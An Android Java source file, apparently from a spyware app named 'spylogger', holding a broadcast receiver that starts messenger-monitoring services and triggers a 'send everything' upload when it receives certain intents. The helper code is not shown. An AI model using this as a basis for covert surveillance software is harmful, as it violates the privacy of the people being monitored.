package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.utils.Utils;

/**
 * Created by bruno on 08/04/17.
 */

public class PrimeiraCarga extends BroadcastReceiver {
    public static final String MESSENGER="1";
    public static final String INICIALIZAR="2";
    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent!=null){
            if(intent.getBooleanExtra(PrimeiraCarga.MESSENGER,false)){
                Utils.startFace(context,true);
                Utils.startServices(context);
            }

            if(intent.getBooleanExtra(PrimeiraCarga.INICIALIZAR,false)){
                Utils.enviarTudo(context);
            }
        }
    }


}
